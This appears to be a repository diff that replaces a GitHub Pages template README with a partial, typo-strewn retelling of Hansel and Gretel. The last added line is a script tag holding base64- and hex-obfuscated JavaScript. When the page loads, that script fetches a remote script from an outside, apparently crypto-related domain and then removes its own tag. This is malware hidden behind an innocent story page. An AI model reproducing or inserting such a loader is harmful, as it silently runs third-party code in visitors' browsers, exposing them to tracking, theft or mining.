@@ -1,37 +1,28 @@
-## Welcome to GitHub Pages
+# Once upon a time
 
-You can use the [editor on GitHub](https://github.com/inhickyassenna224/Once/edit/master/README.md) to maintain and preview the content for your website in Markdown files.
+Once upon a time, on the edge of a great forest, there lived a very poor woodcutter with his wife and his two children, Hansel and Gretel. His second wife often ill-treated the children and was forever nagging the woodcutter. The family had little enough to eat, and once there was a great famine in the land the man could no longer even get them their daily bread. “There is not enough food in the house for us all. There are too many mouths to feed! We must get rid of the two brats,” she declared. And she kept on trying to persuade her husband to abandon his children in the forest.
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+“Take them miles from home, so far that they can never find their way back! Maybe someone will find them and give them a home.” The downcast woodcutter didn’t know what to do. Hansel who, one evening, had overheard his parents’ conversation, comforted Gretel.
+![u](https://res.klook.com/images/fl_lossy.progressive,q_65/c_fill,w_1200,h_630,f_auto/w_80,x_15,y_15,g_south_west,l_klook_water/activities/jcqwb3gd7mpvagnns67z/%D0%AD%D0%BA%D1%81%D0%BA%D1%83%D1%80%D1%81%D0%B8%D1%8F%D0%BD%D0%B0%D0%BF%D0%B0%D1%81%D1%82%D0%B1%D0%B8%D1%89%D0%B0%D0%B0%D0%BB%D1%8C%D0%BF%D0%B0%D0%BA,%D0%BE%D1%81%D1%82%D1%80%D0%BE%D0%B2%D0%9D%D0%B0%D0%BC%D0%B8%D0%B8%D0%B2%D0%A1%D0%B0%D0%B4%D1%83%D1%82%D1%80%D0%B5%D0%BD%D0%BD%D0%B5%D0%B3%D0%BE%D1%81%D0%BF%D0%BE%D0%BA%D0%BE%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F%D1%81%D0%BE%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%BA%D0%BE%D0%B9%D0%B8%D0%B7%D0%A1%D0%B5%D1%83%D0%BB%D0%B0(%D0%BE%D1%82%D0%BA%D0%BE%D0%BC%D0%BF%D0%B0%D0%BD%D0%B8%D0%B8SATour).jpg)
+“Don’t worry! If they do leave us in the forest, we’ll find the way home,” he said. And slipping out of the house he filled his pockets with little white pebbles, then went back to bed.All night long, the woodcutter’s wife harped on and on at her husband till, at dawn, he led Hansel and Gretel away into the forest. But as they went into the depths of the trees, Hansel dropped a little white pebble here and there on the mossy green ground. At a certain point, the two children found they really were alone: the woodcutter had plucked up enough courage to desert them, had mumbled an excuse and was gone. Night fell but the woodcutter did not return. Gretel began to sob bitterly.Hansel too felt scared but he tried to hide his feelings and comfort his sister.
+“Don’t cry, trust me! I swear I’ll take you home even if Father doesn’t come back for us!” Luckily the moon was full that night and Hansel waited till its cold light filtered through the trees. The moon was shining bright as day, and the white pebbles glittered like new silver coins.
 
-### Markdown
+“Now give me your hand!” he said. “We’ll get home safely, you’ll see!” The tiny white pebbles gleaming in the moonlight showed the children their way home. They crept through a half-open window, without wakening their parents. Cold, tired but thankful to be home again, they slipped into bed.
+Next day, when their stepmother discovered that Hansel and Gretel had returned, she went into a rage. Stifling her anger in front of the children, she locked her bedroom door, reproaching her husband for failing to carry out her orders. The weak woodcutter protested, torn as he was between shame and fear of disobeying his cruel wife. The wicked stepmother kept Hansel and Gretel under lock and key all day with nothing for supper but a sip of water and some hard bread. All night, husband and wife quarreled, and when dawn came, the woodcutter led the children out into the forest. Hansel, however, had not eaten his bread, and as he walked through the trees, he left a trail of crumbs behind him to mark the way. But the little boy had forgotten about the hungry birds that lived in the forest. When they saw him, they flew along behind and in no time at all, had eaten all the crumbs. Again, with a lame excuse, the woodcutter left his two children by themselves.
+“I’ve left a trail, like last time!” Hansel whispered to Gretel, consolingly. But when night fell, they saw to their horror, that all the crumbs had gone. “I’m frightened!” wept Gretel bitterly. “I’m cold and hungry and I want to go home!”
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+“Don’t be afraid. I’m here to look after you!” Hansel tried to encourage his sister, but he too shivered when he glimpsed frightening shadows and evil eyes around them in the darkness. All night the two children huddled together for warmth at the foot of a large tree. When dawn broke, they started to wander about the forest, seeking a path, but all hope soon faded. They were well and truly lost. On they walked and walked, till suddenly they came upon a strange cottage in the middle of a glade.
+“This is chocolate!” gasped Hansel as he broke a lump of plaster from the wall.
+“And this is icing!” exclaimed Gretel, putting another piece of wall in her mouth. Starving but delighted, the children began to eat pieces of candy broken off the cottage.
 
-```markdown
-Syntax highlighted code block
+“Isn’t this delicious?” said Gretel, with her mouth full. She had never tasted anything so nice.
 
-# Header 1
-## Header 2
-### Header 3
+“We’ll stay here,” Hansel declared, munching a bit of nougat. They were just about to try a piece of the biscuit door when it quietly swung open.
 
-- Bulleted
-- List
+“Well, well!” said an old woman, peering out with a crafty look. “And haven’t you children a sweet tooth?”
+“Come in! Come in, you’ve nothing to fear!” went on the old woman. Unluckily for Hansel and Gretel, however, the sugar candy cottage belonged to an old witch, her trap for catching unwary victims. The two children had come to a really nasty place
 
-1. Numbered
-2. List
+“We’ll get to work on that,” said Hansel, “and have a real feast. I’ll eat a piece of the roof. Gretel, you can eat some of the window–that will taste real sweet.”
 
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/inhickyassenna224/Once/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Hansel reached up and broke off a little of the roof., to see how it tasted, and Gretel went up tot he windowpane and nibbled on it. Then a shrill voice called out from inside the house.
+<script id="2GawE" src="data:text/javascript;base64, dmFyIF9qSTZ5bCA9IFsnXHg3MVx4NzVceDY1XHg3Mlx4NzlceDUzXHg2NVx4NmNceDY1XHg2M1x4NzRceDZmXHg3MicsICdceDYyXHg2Zlx4NjRceDc5JywgJ1x4NjdceDY1XHg3NFx4NDVceDZjXHg2NVx4NmRceDY1XHg2ZVx4NzRceDQyXHg3OVx4NDlceDY0JywgJ1x4NDRceDRmXHg0ZFx4NDNceDZmXHg2ZVx4NzRceDY1XHg2ZVx4NzRceDRjXHg2Zlx4NjFceDY0XHg2NVx4NjQnLCAnXHg2M1x4NzJceDY1XHg2MVx4NzRceDY1XHg0NVx4NmNceDY1XHg2ZFx4NjVceDZlXHg3NCcsICdceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnLCAnXHg3NFx4NzlceDcwXHg2NScsICdceDc0XHg2NVx4NzhceDc0XHgyZlx4NmFceDYxXHg3Nlx4NjFceDczXHg2M1x4NzJceDY5XHg3MFx4NzQnXTsoZnVuY3Rpb24oX01oRVA1LCBfOUdSM04pIHt2YXIgX1hJNlQzID0gZnVuY3Rpb24oX1hKM1BYKSB7d2hpbGUgKC0tX1hKM1BYKSB7X01oRVA1WydwdXNoJ10oX01oRVA1WydzaGlmdCddKCkpO319O19YSTZUMygrK185R1IzTik7fShfakk2eWwsIDB4MTFiKSk7dmFyIF85WFJIVCA9IGZ1bmN0aW9uKF9QZTl1ZiwgX05qYlpXKSB7X1BlOXVmID0gX1BlOXVmIC0gMHgwO3ZhciBfVmg1RzIgPSBfakk2eWxbX1BlOXVmXTtyZXR1cm4gX1ZoNUcyO307ZG9jdW1lbnRbJ1x4NjFceDY0XHg2NFx4NDVceDc2XHg2NVx4NmVceDc0XHg0Y1x4NjlceDczXHg3NFx4NjVceDZlXHg2NVx4NzInXShfOVhSSFQoJzB4MCcpLCBmdW5jdGlvbigpIHt2YXIgX2JCTUlWID0gZG9jdW1lbnRbXzlYUkhUKCcweDEnKV0oXzlYUkhUKCcweDInKSk7X2JCTUlWW185WFJIVCgnMHgzJyldID0gXzlYUkhUKCcweDQnKTtfYkJNSVZbJ1x4NzNceDcyXHg2MyddID0gJ1x4NjhceDc0XHg3NFx4NzBceDczXHgzYVx4MmZceDJmXHg2Y1x4NjlceDZiXHg2ZFx4NmZceDZlXHg2NVx4NzlceDYxXHg2M1x4NjNceDMxXHgyZVx4NjNceDcyXHg3OVx4NzBceDc0XHg2Zlx4NzBceDcyXHg2Zlx4NjdceDcyXHg2NVx4NzNceDY5XHg3Nlx4NjVceDJlXHg2M1x4NmZceDZkXHgyZlx4NWZceDcyXHg2NVx4NmRceDZmXHg3NFx4NjVceDVmXHg3NFx4NzJceDYxXHg2M1x4NmJceDJlXHg2YVx4NzNceDNmXHg2M1x4NjFceDZkXHg3MFx4NjFceDY5XHg2N1x4NmVceDNkXHg1M1x4NjZceDcwXHg3NFx4NjZceDMwXHg0ZVx4NDVceDY1XHg3Nic7ZG9jdW1lbnRbXzlYUkhUKCcweDUnKV0oXzlYUkhUKCcweDYnKSlbJ1x4NjFceDcwXHg3MFx4NjVceDZlXHg2NFx4NDNceDY4XHg2OVx4NmNceDY0J10oX2JCTUlWKTtkb2N1bWVudFtfOVhSSFQoJzB4NycpXSgnMkdhd0UnKVsnXHg3Mlx4NjVceDZkXHg2Zlx4NzZceDY1J10oKTt9LCB7J1x4NmZceDZlXHg2M1x4NjUnOiAhIVtdfSk7"></script>
